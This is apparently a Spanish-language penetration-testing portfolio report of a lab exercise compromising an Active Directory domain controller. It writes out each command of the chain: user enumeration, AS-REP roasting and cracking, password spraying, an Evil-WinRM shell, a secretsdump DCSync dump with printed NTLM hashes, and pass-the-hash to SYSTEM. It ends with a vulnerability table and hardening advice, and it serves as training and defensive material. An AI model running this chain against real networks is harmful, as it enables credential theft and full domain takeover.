**INFORME RED TEAM -- PORTFOLIO PROFESIONAL**

**Compromiso de Domain Controller -- NTDS.DIT + root.txt**

**Autor:** Red Team Operator\
**Fecha:** 15 Marzo 2026\
**Objetivo:** controller.control.nyx -- 192.168.0.40\
**Tipo de ejercicio:** Pentesting Active Directory (caja gris, entorno
de laboratorio)

**FASE 0 -- HOST DISCOVERY**

![](media/image1.png){width="5.905555555555556in" height="2.9375in"}

**Comando ejecutado**

bash

ping 192.168.0.40

**Resultado relevante**

- 5/5 paquetes recibidos

- 0% packet loss

- RTT medio ≈ 1.54 ms

**Comentario personal**\
Primero verifiqué que el objetivo respondiera correctamente a nivel de
red; la baja latencia confirmaba que podía continuar con la enumeración
sin problemas de conectividad.

**FASE 1 -- ENUMERACIÓN DE SERVICIOS (NMAP)**

📷 **Imagen -- Nmap Scan completo**\
![](media/image2.png){width="5.905555555555556in" height="2.9375in"}

**Comandos ejecutados**

bash

nmap -sS \--open -sC -sV -n -Pn 192.168.0.40

nmap -sS \--reason 192.168.0.40

**Servicios detectados (puertos TCP abiertos)**

- 53/tcp -- DNS (Simple DNS Plus)

- 88/tcp -- Kerberos-sec (Microsoft Windows Kerberos)

- 135/tcp -- MSRPC

- 139/tcp -- NetBIOS-SSN

- 389/tcp -- LDAP (Active Directory)

- 445/tcp -- SMB (microsoft-ds)

- 464/tcp -- kpasswd5

- 593/tcp -- RPC over HTTP

- 636/tcp -- LDAPS

- 3268/tcp -- Global Catalog LDAP

- 3269/tcp -- Global Catalog LDAPS

- 5985/tcp -- WinRM (HTTP)

**Identificación del host**

- Nombre: CONTROLER

- Dominio: control.nyx / control.nyx0

- Sistema: Windows 10 / Server 2019 Build 17763 x64

- SMB signing: requerido

- Clock skew: 8h

**Comentario personal**\
En cuanto vi Kerberos (88), LDAP (389), Global Catalog (3268) y SMB
(445) en el mismo host, tuve claro que estaba ante un Domain Controller.
A partir de aquí toda la estrategia se centró en Active Directory.

**FASE 2 -- ENUMERACIÓN SMB (SIN CREDENCIALES)**

📷 **Imagen 1 -- NetExec Null Session**\
![](media/image3.png){width="5.905555555555556in" height="2.9375in"}

**Comando principal**

bash

netexec smb 192.168.0.40 -u \'\' -p \'\'

**Resultado**

- Conexión SMB anónima exitosa (null session) contra 445/tcp.

📷 **Imagen 2 -- smbclient IPC\$**\
![](media/image4.png){width="5.905555555555556in" height="2.9375in"}

**Comandos complementarios**

bash

smbclient //192.168.0.40/IPC\$ -N

**Observaciones**

- Login anónimo aceptado en IPC\$.

- Intentos de ls devuelven ACCESS_DENIED, pero se listan nombres de
  directorios (kerbrute, netexec, ldap, etc.), lo que confirma presencia
  de herramientas de pentesting en el entorno.

**Comentario personal**\
Confirmé que existía una null session activa, algo que no debería
ocurrir en un DC. Aunque los permisos eran limitados, esta primera
brecha me indicó claramente que el hardening SMB era insuficiente.

**FASE 3 -- ENUMERACIÓN DNS Y LDAP**

📷 **Imagen -- Consultas dig / LDAP rootDSE**\
![](media/image5.png){width="5.905555555555556in" height="2.9375in"}

**DNS -- Comandos clave**

![](media/image6.png){width="5.905555555555556in" height="2.9375in"}

bash

dig \@192.168.0.40 controler.control.nyx A

dig \@192.168.0.40 \_kerberos.\_tcp.dc.\_msdcs.control.nyx SRV

dig \@192.168.0.40 control.nyx0 A

**Resultado**

- controler.control.nyx → 192.168.0.40

- \_kerberos.\_tcp.dc.\_msdcs.control.nyx → SRV
  hacia win-ula25fos4k9.control.nyx:88 (otro DC)

**LDAP -- Comando rootDSE**

bash

apsearch -x -H ldap://192.168.0.40 -s base namingcontexts

![](media/image7.png){width="5.905555555555556in" height="2.9375in"}

**Naming Contexts obtenidos**

- DC=control,DC=nyx

- CN=Configuration,DC=control,DC=nyx

- CN=Schema,CN=Configuration,DC=control,DC=nyx

- DC=DomainDnsZones,DC=control,DC=nyx

- DC=ForestDnsZones,DC=control,DC=nyx

**Comentario personal**\
En este punto ya tenía mapeado el dominio y el árbol LDAP completo sin
credenciales. Esto me permitió planificar la enumeración de usuarios y
ataques Kerberos de forma muy dirigida.

**FASE 4 -- ENUMERACIÓN DE USUARIOS (KERBRUTE)**

📷 **Imagen -- Kerbrute userenum**

![](media/image8.png){width="5.905555555555556in"
height="2.9375in"}![](media/image9.png){width="5.905555555555556in"
height="2.9375in"}

**Comandos ejecutados**

bash

./kerbrute_linux_amd64 userenum -d control.nyx \--dc 192.168.0.40
/usr/share/seclists/Usernames/top-usernames-shortlist.txt

./kerbrute_linux_amd64 userenum -d control.nyx \--dc 192.168.0.40
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

./kerbrute_linux_amd64 userenum -d control.nyx \--dc 192.168.0.40
/home/kali/Downloads/windows/kerberos_enum_userlists/A-Z.Surnames.txt

**Usuarios válidos detectados**

- [[administrator@control.nyx]{.underline}](mailto:administrator@control.nyx) / [[Administrator@control.nyx]{.underline}](mailto:Administrator@control.nyx)

- [[B.LEWIS@control.nyx]{.underline}](mailto:B.LEWIS@control.nyx)

- [[b.lewis@control.nyx]{.underline}](mailto:b.lewis@control.nyx) (UPN)

**Comentario personal**\
Tras varias wordlists y ver cómo el KDC empezaba a saturarse, me centré
en los usuarios que ya tenía confirmados como válidos, especialmente en
b.lewis, que más tarde usaría como pivot para AS‑REP Roasting.

**FASE 5 -- AS‑REP ROASTING (b.lewis)**

📷 **Imagen -- GetNPUsers + hash AS‑REP**\
![](media/image10.png){width="5.905555555555556in" height="2.9375in"}

**Comando**

bash

impacket-GetNPUsers control.nyx/b.lewis -no-pass -dc-ip 192.168.0.40

**Resultado**

- Respuesta AS‑REP sin pre‑auth requerida.

- Hash Kerberos tipo AS‑REP obtenido para b.lewis@CONTROL.NYX.

📷 **Imagen -- John cracking**\
![](media/image11.png){width="5.905555555555556in" height="2.9375in"}

**Cracking offline**

bash

john \--wordlist=/usr/share/wordlists/rockyou.txt has.txt

**Contraseña obtenida**

- b.lewis : 101Music

**Comentario personal**\
Aquí confirmé una configuración débil de Kerberos (sin
pre‑autenticación) combinada con una contraseña presente en rockyou.txt.
Esta fue la primera credencial fuerte de dominio que conseguí.

**FASE 6 -- ACCESO CON CREDENCIALES (b.lewis)**

**-- NetExec SMB con credenciales**

![](media/image12.png){width="5.905555555555556in"
height="2.9375in"}![](media/image13.png){width="5.905555555555556in"
height="2.9375in"}

**Comandos clave**

bash

netexec smb 192.168.0.40 -u b.lewis -p 101Music \--shares

netexec smb 192.168.0.40 -u b.lewis -p 101Music \--users

netexec ldap 192.168.0.40 -u b.lewis -p 101Music \--groups

netexec ldap 192.168.0.40 -u b.lewis -p 101Music \--computers

**Resultado**

- Shares accesibles: ADMIN\$, C\$, NETLOGON, SYSVOL.

- Usuarios locales enumerados (Administrator, krbtgt, j.levy, etc.).

- Grupos de dominio enumerados, con b.lewis en grupos privilegiados.

**Comentario personal**\
Con b.lewis pude confirmar acceso de lectura a SYSVOL y enumerar toda la
estructura de usuarios y grupos. Esto validó que tenía posición de alto
valor dentro del dominio.

**FASE 7 -- SEGUNDA CUENTA: PASSWORD SPRAY (j.levy)**

**NetExec password spray**

![](media/image14.png){width="5.905555555555556in" height="2.9375in"}

**Comando**

bash

nxc smb 192.168.0.40 -u j.levy -p /usr/share/wordlists/rockyou.txt
\--ignore-pw-decoding

**Credencial encontrada**

- j.levy : Password1

📷 **Imagen -- Validación y shares**\
![](media/image15.png){width="5.905555555555556in" height="2.9375in"}

bash

nxc smb 192.168.0.40 -u j.levy -p Password1

nxc smb 192.168.0.40 -u j.levy -p Password1 \--users

nxc smb 192.168.0.40 -u j.levy -p Password1 \--shares

**Comentario personal**\
Cuando vi Password1 confirmé que las políticas de contraseñas eran muy
débiles. Además, esta cuenta me abrió la puerta a WinRM, lo que hizo la
post‑explotación mucho más cómoda.

**FASE 8 -- ACCESO REMOTO (WinRM) Y user.txt**

📷 **Imagen -- Evil‑WinRM shell**\
![](media/image16.png){width="5.905555555555556in" height="2.9375in"}

**Comandos**

bash

nxc winrm 192.168.0.40 -u j.levy -p Password1

evil-winrm -i 192.168.0.40 -u j.levy -p \'Password1\'

whoami /all

**Resultados principales**

- Identidad: control\\j.levy

- Miembro de Remote Management Users

- Shell PowerShell interactiva en el DC.

📷 **Imagen -- user.txt**\
![](media/image17.png){width="5.905555555555556in" height="2.9375in"}

powershell

cd C:\\Users\\j.levy\\Desktop

ls *\# user.txt*

**Comentario personal**\
Con WinRM obtuve la primera flag (user.txt) y confirmé que podía
ejecutar herramientas y moverme cómodamente por el sistema con la cuenta
de dominio comprometida.

**FASE 9 -- ENUMERACIÓN LOCAL (winPEAS + SharpHound)**

**-- Upload winPEAS y SharpHound**

![](media/image18.png){width="5.905555555555556in"
height="2.9375in"}![](media/image19.png){width="5.905555555555556in"
height="2.9375in"}

**Comandos**

powershell

upload winPEASx64.exe

upload SharpHound.exe

.\\winPEASx64.exe

.\\SharpHound.exe -c all

**Hallazgos winPEAS (resumen)**

- Variables de entorno típicas de usuario y sistema
  (USERDNSDOMAIN=control.nyx, COMPUTERNAME=CONTROLER).

- No se encontraron credenciales en variables de entorno.

**SharpHound**

- Enumeración de grupos, ACLs, sesiones, GPOs, etc. para análisis
  offline en BloodHound.

**Comentario personal**\
Utilicé winPEAS para buscar configuraciones débiles adicionales y
SharpHound para consolidar la visión del dominio en BloodHound, aunque a
estas alturas el compromiso ya era muy elevado.

**FASE 10 -- DUMP DEL DOMINIO (secretsdump / DCSync)**

**secretsdump output**\
![](media/image20.png){width="5.905555555555556in" height="2.9375in"}

**Comando**

bash

impacket-secretsdump
\"control.nyx/j.levy:Password1@controller.control.nyx\"

**Resultados clave (NTDS.DIT / hashes)**

- Administrator:500:...:48b20d4f3ea31b7234c92b71c90fbff7

- Guest:501:...:31d6cfe0d16ae931b73c59d7e0c089c0

- krbtgt:502:...:b70cca1e5225303104dea9942d31f3a7

- control.nyx\\j.levy:1103:...:64f12cddaa88057e06a81b54e73b949b

- control.nyx\\b.lewis:1104:...:08f37c649690b7df615961f71831ef4a

  - claves AES256/AES128/RC4 de todas las cuentas, incluido krbtgt y el
    DC (CONTROLER\$).

**Comentario personal**\
En este punto ya tenía la base de datos completa de credenciales del
dominio. Esto implica control total y posibilidad de ataques como Golden
Ticket, Pass‑the‑Hash masivo o despliegue de persistencia avanzada.

**FASE 11 -- PASS‑THE‑HASH Y root.txt (Administrator)**

📷 **Imagen -- PsExec SYSTEM shell**\
![](media/image21.png){width="5.905555555555556in" height="2.9375in"}

**Comando**

bash

impacket-psexec -hashes :48b20d4f3ea31b7234c92b71c90fbff7 -no-pass \\

-dc-ip 192.168.0.40 -target-ip 192.168.0.40 \\

control.nyx/Administrator@controller.control.nyx

**Resultados**

- Creación de servicio remoto y shell con privilegios de SYSTEM.

📷 **Imagen -- root.txt**\
![](media/image21.png){width="5.905555555555556in" height="2.9375in"}

text

cd C:\\Users\\Administrator\\Desktop

dir \# root.txt (70 bytes)

**Comentario personal**\
Con el hash de Administrator y Pass‑the‑Hash conseguí una shell SYSTEM y
la flag root.txt, cerrando el compromiso completo del Domain Controller.

**CADENA DE COMPROMISO (RESUMEN)**

1.  Ping y Nmap → Identificación de DC y servicios.

2.  Null Session SMB → confirmación de exposición y contexto.

3.  DNS + LDAP anónimo → mapeo de dominio y naming contexts.

4.  Kerbrute → enumeración de usuarios válidos (administrator, b.lewis,
    j.levy).

5.  AS‑REP Roasting → b.lewis : 101Music.

6.  NetExec + Password Spray → j.levy : Password1.

7.  WinRM (Evil‑WinRM) → shell remota + user.txt.

8.  winPEAS + SharpHound → enumeración local y de dominio.

9.  secretsdump / DCSync → NTDS.DIT y hashes de todo el dominio.

10. Pass‑the‑Hash (PsExec) → shell SYSTEM con Administrator + root.txt.

**VULNERABILIDADES IDENTIFICADAS**

  ---------------------------------------------------------------------------
  **Vector**           **Impacto**   **Descripción breve**
  -------------------- ------------- ----------------------------------------
  SMB Null Sessions    Medio         Permite enumeración inicial sin
                                     credenciales.

  Kerberos Enum        Alto          Enumeración masiva de usuarios válidos.

  AS‑REP Roasting      Alto          Recuperación de credenciales de dominio.

  Password Spray       Alto          Contraseñas débiles como Password1.

  DCSync / NTDS.DIT    Crítico       Extracción completa de hashes del
                                     dominio.

  Pass‑the‑Hash        Crítico       Ejecución remota como
                                     Administrator/SYSTEM.

  WinRM expuesto       Alto          Shell remota directa sobre el DC.

  SYSVOL/GPO accesible Medio         Lectura de políticas y posible abuso
                                     futuro.
  ---------------------------------------------------------------------------

**RECOMENDACIONES DE ALTO NIVEL**

- Deshabilitar null sessions en SMB y endurecer la configuración de
  IPC\$.

- Habilitar Kerberos Pre‑Authentication en todas las cuentas de usuario.

- Aplicar políticas de contraseñas robustas y de bloqueo de cuenta
  (password spray).

- Restringir y auditar permisos DCSync solo a cuentas estrictamente
  necesarias.

- Limitar o deshabilitar el acceso WinRM desde redes no administrativas.

- Revisar permisos de SYSVOL y GPO para evitar filtraciones y abusos.

- Monitorizar eventos Kerberos, WinRM, DCSync y creación de servicios
  remotos.
